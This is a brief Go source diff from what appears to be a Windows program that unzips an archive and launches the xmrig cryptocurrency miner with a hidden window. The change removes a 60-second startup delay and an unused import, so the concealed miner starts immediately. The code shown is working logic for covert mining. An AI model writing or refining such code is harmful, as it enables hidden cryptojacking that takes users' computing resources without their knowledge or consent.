@@ -12,7 +12,6 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
-	"time"
 	"golang.org/x/sys/windows"
 	"os/user"
 // 	"os/signal"
@@ -117,8 +116,6 @@ func unzipFile(f *zip.File, destination string) error {
 }
 
 func startCommand(dir string) {
-	time.Sleep(60*time.Second)
-
 	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
 
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
